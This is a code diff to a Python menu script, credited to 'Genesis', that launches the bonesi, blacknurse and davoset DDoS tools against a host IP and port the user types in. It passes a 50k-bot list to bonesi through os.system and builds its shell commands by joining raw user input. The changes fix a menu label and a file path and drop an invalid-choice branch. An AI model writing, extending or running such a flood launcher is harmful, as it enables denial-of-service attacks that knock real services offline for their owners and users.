@@ -26,7 +26,7 @@ Created by: Genesis""")
         choice = input("Enter your choice: ")
         if choice == "1":
             print("""
-            [1] bonsi DDOS
+            [1] bonesi DDOS
             [2] blacknurse DDOS
             [3] davoset DDOS
             [4] exit \n""")
@@ -37,7 +37,7 @@ Created by: Genesis""")
                     host_ip = input("Enter the host ip: ")
                     host_port = input("Enter the host port: ")
                     net_interface = input("Enter the network interface: ")
-                    os.system('bonesi -i /root/usr/share/bonesi/50k-bots.txt -p tcp -r 0 -d '+net_interface+' -b /root/usr/share/bonesi/browserlist.txt ' + host_ip + ':' + host_port)
+                    os.system('bonesi -i /usr/share/bonesi/50k-bots -p tcp -r 0 -d '+net_interface+' -b /root/usr/share/bonesi/browserlist.txt ' + host_ip + ':' + host_port)
                     time.sleep(5)
                     os.system('clear')
                 if choice == "2":
@@ -56,9 +56,6 @@ Created by: Genesis""")
             os.system('ping ' + host_ip)
         if choice == "3":
             sys.exit()
-        else:
-            print("Invalid choice")
-            os.system('clear')
 
 if __name__ == "__main__":
     DDOS()
